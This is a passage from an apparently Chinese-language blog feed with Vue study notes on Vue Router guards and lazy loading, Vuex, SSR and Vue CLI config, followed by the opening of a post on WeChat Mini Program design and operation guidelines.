<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Foo</span> = (<span class="params"></span>) =&gt; <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(&#123; <span class="comment">/* 组件定义对象 */</span> &#125;)</span><br></pre></td></tr></table></figure>

<p>第二，在 Webpack 2 中，我们可以使用动态 import语法来定义代码分块点 (split point)：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">&#x27;./Foo.vue&#x27;</span>) <span class="comment">// 返回 Promise</span></span><br></pre></td></tr></table></figure>

<p>结合这两者，这就是如何定义一个能够被 Webpack 自动代码分割的异步组件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Foo</span> = (<span class="params"></span>) =&gt; <span class="keyword">import</span>(<span class="string">&#x27;./Foo.vue&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>在路由配置中什么都不需要改变，只需要像往常一样使用 Foo：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/foo&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Foo</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="导航守卫"><a href="#导航守卫" class="headerlink" title="导航守卫"></a>导航守卫</h2><p>导航守卫主要用来通过跳转或取消的方式守卫导航。有多种机会植入路由导航过程中：全局的, 单个路由独享的, 或者组件级的。参数或查询的改变并不会触发进入&#x2F;离开的导航守卫。</p>
<p>全局前置守卫：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123; ... &#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>当一个导航触发时，全局前置守卫按照创建顺序调用。守卫是异步解析执行，此时导航在所有守卫 resolve 完之前一直处于 等待中。</p>
<p>每个守卫方法接收三个参数：</p>
<ul>
<li>to: Route: 即将要进入的目标 路由对象</li>
<li>from: Route: 当前导航正要离开的路由</li>
<li>next: Function: 一定要调用该方法来 resolve 这个钩子。执行效果依赖 next 方法的调用参数。<ul>
<li>next(): 进行管道中的下一个钩子。如果全部钩子执行完了，则导航的状态就是 confirmed (确认的)。</li>
<li>next(false): 中断当前的导航。如果浏览器的 URL 改变了 (可能是用户手动或者浏览器后退按钮)，那么 URL 地址会重置到 from 路由对应的地址。</li>
<li>next(‘&#x2F;‘) 或者 next({ path: ‘&#x2F;‘ }): 跳转到一个不同的地址。当前的导航被中断，然后进行一个新的导航。你可以向 next 传递任意位置对象，且允许设置诸如 replace: true、name: ‘home’ 之类的选项以及任何用在 router-link 的 to prop 或 router.push 中的选项。</li>
<li>next(error): (2.4.0+) 如果传入 next 的参数是一个 Error 实例，则导航会被终止且该错误会被传递给 router.onError() 注册过的回调。</li>
</ul>
</li>
</ul>
<p>全局解析守卫</p>
<p>在 2.5.0+ 你可以用 router.beforeResolve 注册一个全局守卫。这和 router.beforeEach 类似，区别是在导航被确认之前，同时在所有组件内守卫和异步路由组件被解析之后，解析守卫就被调用。</p>
<p>全局后置钩子</p>
<p>和守卫不同的是，这些钩子不会接受 next 函数也不会改变导航本身：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">afterEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>路由独享守卫</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/foo&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: <span class="title class_">Foo</span>,</span><br><span class="line">      <span class="attr">beforeEnter</span>: <span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>组件内守卫</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Foo</span> = &#123;</span><br><span class="line">  <span class="attr">template</span>: <span class="string">`...`</span>,</span><br><span class="line">  beforeRouteEnter (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">    <span class="comment">// 在渲染该组件的对应路由被 confirm 前调用</span></span><br><span class="line">    <span class="comment">// 不！能！获取组件实例 `this`</span></span><br><span class="line">    <span class="comment">// 因为当守卫执行前，组件实例还没被创建</span></span><br><span class="line">  &#125;,</span><br><span class="line">  beforeRouteUpdate (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">    <span class="comment">// 在当前路由改变，但是该组件被复用时调用</span></span><br><span class="line">    <span class="comment">// 举例来说，对于一个带有动态参数的路径 /foo/:id，在 /foo/1 和 /foo/2 之间跳转的时候，</span></span><br><span class="line">    <span class="comment">// 由于会渲染同样的 Foo 组件，因此组件实例会被复用。而这个钩子就会在这个情况下被调用。</span></span><br><span class="line">    <span class="comment">// 可以访问组件实例 `this`</span></span><br><span class="line">  &#125;,</span><br><span class="line">  beforeRouteLeave (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">    <span class="comment">// 导航离开该组件的对应路由时调用</span></span><br><span class="line">    <span class="comment">// 可以访问组件实例 `this`</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整的导航解析流程：<br>  导航被触发。<br>  在失活的组件里调用离开守卫。<br>  调用全局的 beforeEach 守卫。<br>  在重用的组件里调用 beforeRouteUpdate 守卫 (2.2+)。<br>  在路由配置里调用 beforeEnter。<br>  解析异步路由组件。<br>  在被激活的组件里调用 beforeRouteEnter。<br>  调用全局的 beforeResolve 守卫 (2.5+)。<br>  导航被确认。<br>  调用全局的 afterEach 钩子。<br>  触发 DOM 更新。<br>  用创建好的实例调用 beforeRouteEnter 守卫中传给 next 的回调函数。</p>
<p>路由元信息</p>
<p>定义路由的时候可以配置 meta 字段：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/foo&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: <span class="title class_">Foo</span>,</span><br><span class="line">      <span class="attr">children</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">path</span>: <span class="string">&#x27;bar&#x27;</span>,</span><br><span class="line">          <span class="attr">component</span>: <span class="title class_">Bar</span>,</span><br><span class="line">          <span class="comment">// a meta field</span></span><br><span class="line">          <span class="attr">meta</span>: &#123; <span class="attr">requiresAuth</span>: <span class="literal">true</span> &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (to.<span class="property">matched</span>.<span class="title function_">some</span>(<span class="function"><span class="params">record</span> =&gt;</span> record.<span class="property">meta</span>.<span class="property">requiresAuth</span>)) &#123;</span><br><span class="line">    <span class="comment">// this route requires auth, check if logged in</span></span><br><span class="line">    <span class="comment">// if not, redirect to login page.</span></span><br><span class="line">    <span class="keyword">if</span> (!auth.<span class="title function_">loggedIn</span>()) &#123;</span><br><span class="line">      <span class="title function_">next</span>(&#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;/login&#x27;</span>,</span><br><span class="line">        <span class="attr">query</span>: &#123; <span class="attr">redirect</span>: to.<span class="property">fullPath</span> &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">next</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>() <span class="comment">// 确保一定要调用 next()</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>过渡效果：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition</span> <span class="attr">:name</span>=<span class="string">&quot;transitionName&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Foo</span> = &#123;</span><br><span class="line">  <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;transition name=&quot;slide&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;foo&quot;&gt;...&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/transition&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Bar</span> = &#123;</span><br><span class="line">  <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;transition name=&quot;fade&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;bar&quot;&gt;...&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/transition&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">watch</span>: &#123;</span><br><span class="line">  <span class="string">&#x27;$route&#x27;</span> (to, <span class="keyword">from</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> toDepth = to.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="property">length</span></span><br><span class="line">    <span class="keyword">const</span> fromDepth = <span class="keyword">from</span>.<span class="property">path</span>.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="property">length</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">transitionName</span> = toDepth &lt; fromDepth ? <span class="string">&#x27;slide-right&#x27;</span> : <span class="string">&#x27;slide-left&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><p>导航后获取数据</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;loading&quot;</span> <span class="attr">class</span>=<span class="string">&quot;loading&quot;</span>&gt;</span></span><br><span class="line">      Loading...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;error&quot;</span> <span class="attr">class</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123; error &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;post&quot;</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123; post.title &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; post.body &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">loading</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">post</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">error</span>: <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  created () &#123;</span><br><span class="line">    <span class="comment">// 组件创建完后获取数据，</span></span><br><span class="line">    <span class="comment">// 此时 data 已经被 observed 了</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">fetchData</span>()</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">watch</span>: &#123;</span><br><span class="line">    <span class="comment">// 如果路由有变化，会再次执行该方法</span></span><br><span class="line">    <span class="string">&#x27;$route&#x27;</span>: <span class="string">&#x27;fetchData&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    fetchData () &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">error</span> = <span class="variable language_">this</span>.<span class="property">post</span> = <span class="literal">null</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">loading</span> = <span class="literal">true</span></span><br><span class="line">      <span class="comment">// replace getPost with your data fetching util / API wrapper</span></span><br><span class="line">      <span class="title function_">getPost</span>(<span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">params</span>.<span class="property">id</span>, <span class="function">(<span class="params">err, post</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">loading</span> = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">error</span> = err.<span class="title function_">toString</span>()</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">post</span> = post</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>导航前获取数据</p>
<p>通过这种方式，我们在导航转入新的路由前获取数据。我们可以在接下来的组件的 beforeRouteEnter 守卫中获取数据，当数据获取成功后只调用 next 方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">post</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">error</span>: <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  beforeRouteEnter (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">    <span class="title function_">getPost</span>(to.<span class="property">params</span>.<span class="property">id</span>, <span class="function">(<span class="params">err, post</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">next</span>(<span class="function"><span class="params">vm</span> =&gt;</span> vm.<span class="title function_">setData</span>(err, post))</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 路由改变前，组件就已经渲染完了</span></span><br><span class="line">  <span class="comment">// 逻辑稍稍不同</span></span><br><span class="line">  beforeRouteUpdate (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">post</span> = <span class="literal">null</span></span><br><span class="line">    <span class="title function_">getPost</span>(to.<span class="property">params</span>.<span class="property">id</span>, <span class="function">(<span class="params">err, post</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">setData</span>(err, post)</span><br><span class="line">      <span class="title function_">next</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    setData (err, post) &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">error</span> = err.<span class="title function_">toString</span>()</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">post</span> = post</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h1><h2 id="State"><a href="#State" class="headerlink" title="State"></a>State</h2><p>从 store 实例中读取状态最简单的方法就是在计算属性中返回某个状态：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Counter</span> = &#123;</span><br><span class="line">  <span class="attr">template</span>: <span class="string">`&lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt;`</span>,</span><br><span class="line">  <span class="attr">computed</span>: &#123;</span><br><span class="line">    count () &#123;</span><br><span class="line">      <span class="keyword">return</span> store.<span class="property">state</span>.<span class="property">count</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Vuex 通过 store 选项，提供了一种机制将状态从根组件“注入”到每一个子组件中（需调用 Vue.use(Vuex)）：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  <span class="comment">// 把 store 对象提供给 “store” 选项，这可以把 store 的实例注入所有的子组件</span></span><br><span class="line">  store,</span><br><span class="line">  <span class="attr">components</span>: &#123; <span class="title class_">Counter</span> &#125;,</span><br><span class="line">  <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;app&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;counter&gt;&lt;/counter&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Counter</span> = &#123;</span><br><span class="line">  <span class="attr">template</span>: <span class="string">`&lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt;`</span>,</span><br><span class="line">  <span class="attr">computed</span>: &#123;</span><br><span class="line">    count () &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">state</span>.<span class="property">count</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Getter"><a href="#Getter" class="headerlink" title="Getter"></a>Getter</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">  doneTodosCount () &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">state</span>.<span class="property">todos</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">todo</span> =&gt;</span> todo.<span class="property">done</span>).<span class="property">length</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">todos</span>: [</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">text</span>: <span class="string">&#x27;...&#x27;</span>, <span class="attr">done</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">text</span>: <span class="string">&#x27;...&#x27;</span>, <span class="attr">done</span>: <span class="literal">false</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">getters</span>: &#123;</span><br><span class="line">    <span class="attr">doneTodos</span>: <span class="function"><span class="params">state</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> state.<span class="property">todos</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">todo</span> =&gt;</span> todo.<span class="property">done</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="Mutation"><a href="#Mutation" class="headerlink" title="Mutation"></a>Mutation</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">1</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">    increment (state) &#123;</span><br><span class="line">      <span class="comment">// 变更状态</span></span><br><span class="line">      state.<span class="property">count</span>++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.<span class="title function_">commit</span>(<span class="string">&#x27;increment&#x27;</span>)</span><br><span class="line">store.<span class="title function_">commit</span>(<span class="string">&#x27;increment&#x27;</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h2><p>可以异步</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">    increment (state) &#123;</span><br><span class="line">      state.<span class="property">count</span>++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">    increment (context) &#123;</span><br><span class="line">      context.<span class="title function_">commit</span>(<span class="string">&#x27;increment&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.<span class="title function_">dispatch</span>(<span class="string">&#x27;increment&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleA = &#123;</span><br><span class="line">  <span class="attr">state</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">getters</span>: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> moduleB = &#123;</span><br><span class="line">  <span class="attr">state</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123; ... &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  <span class="attr">modules</span>: &#123;</span><br><span class="line">    <span class="attr">a</span>: moduleA,</span><br><span class="line">    <span class="attr">b</span>: moduleB</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.<span class="property">state</span>.<span class="property">a</span> <span class="comment">// -&gt; moduleA 的状态</span></span><br><span class="line">store.<span class="property">state</span>.<span class="property">b</span> <span class="comment">// -&gt; moduleB 的状态</span></span><br></pre></td></tr></table></figure>

<h1 id="SSR"><a href="#SSR" class="headerlink" title="SSR"></a>SSR</h1><p>服务端渲染</p>
<p>安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install vue vue-server-renderer --save</span><br></pre></td></tr></table></figure>

<p>渲染示例</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第 1 步：创建一个 Vue 实例</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Vue</span> = <span class="built_in">require</span>(<span class="string">&#x27;vue&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">template</span>: <span class="string">`&lt;div&gt;Hello World&lt;/div&gt;`</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第 2 步：创建一个 renderer</span></span><br><span class="line"><span class="keyword">const</span> renderer = <span class="built_in">require</span>(<span class="string">&#x27;vue-server-renderer&#x27;</span>).<span class="title function_">createRenderer</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第 3 步：将 Vue 实例渲染为 HTML</span></span><br><span class="line">renderer.<span class="title function_">renderToString</span>(app, <span class="function">(<span class="params">err, html</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) <span class="keyword">throw</span> err</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(html)</span><br><span class="line">  <span class="comment">// =&gt; &lt;div data-server-rendered=&quot;true&quot;&gt;Hello World&lt;/div&gt;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 2.5.0+，如果没有传入回调函数，则会返回 Promise：</span></span><br><span class="line">renderer.<span class="title function_">renderToString</span>(app).<span class="title function_">then</span>(<span class="function"><span class="params">html</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(html)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="Vue-Cli"><a href="#Vue-Cli" class="headerlink" title="Vue Cli"></a>Vue Cli</h1><h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p><a href="https://cli.vuejs.org/zh/config/#vue-config-js">配置</a></p>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p><code>vue.config.js</code>文件：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="comment">// 配置根目录位置</span></span><br><span class="line">    <span class="attr">publicPath</span>: process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span></span><br><span class="line">        ? <span class="string">&#x27;/production-sub-path/&#x27;</span></span><br><span class="line">        : <span class="string">&#x27;/&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序</title>
    <url>/2020/03/24/%E5%89%8D%E7%AB%AF/WechatProgram/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h1><h2 id="设计规范"><a href="#设计规范" class="headerlink" title="设计规范"></a>设计规范</h2><p>友好：页面应该重点突出，流程明确。<br>清洗：导航明确，减少等待，异常可控。<br>便捷：减少输入（使用其他IO），避免误操作，操作流程。<br>同一：视觉统一。</p>
<h2 id="运营规范"><a href="#运营规范" class="headerlink" title="运营规范"></a>运营规范</h2><p>账号信息：描述（主要，用户搜索根据）<br>服务类目：类目与内容一致（体验良好）<br>功能：完整，无搜索推荐，不互推<br>内容：禁止诱导，不可营销与广告为主，禁止测试类，游戏（有专门的微信小游戏）<br>数据：获取用户数据需告知</p>
<p><a href="https://mp.weixin.qq.com/">小程序官网</a><br><a href="https://mp.weixin.qq.com/deug/wxadoc/dev/index.html">开发文档</a><br><a href="https://developers.weixin.qq.com/">开发者社区</a></p>
